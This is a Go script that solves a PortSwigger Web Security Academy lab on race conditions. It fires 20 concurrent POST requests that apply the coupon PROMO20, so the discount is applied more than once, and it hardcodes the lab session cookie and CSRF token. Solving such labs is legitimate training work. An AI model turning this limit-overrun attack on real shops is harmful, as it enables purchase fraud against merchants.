// This Go script attempts to exploit a race condition in the purchasing flow of the lab by sending multiple concurrent requests to apply
// a discount coupon (PROMO20). This can potentially override the intended price if a rate limit is bypassed, enabling the item to be
// purchased at a lower price than intended.

// https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"sync"
)

var (
	postURL = "https://0a4200f203d2ef8082225ba200120045.web-security-academy.net/cart/coupon"
	cookies = "session=VP9qsK4nvFY19ReUlOUsgCgHRhjgStbF"
	data    = url.Values{
		"csrf":   {"g5MuAdg0t0OavyS7fFAQOg7foXbWvYvf"},
		"coupon": {"PROMO20"},
	}
	headers = map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}
)

func sendPostRequest(wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{}
	req, err := http.NewRequest("POST", postURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}
	req.Header.Set("Cookie", cookies)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Printf("POST status: %d, response: %s\n", resp.StatusCode, string(body))
}

func main() {
	var wg sync.WaitGroup
	numRequests := 20

	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go sendPostRequest(&wg)
	}

	wg.Wait()
}
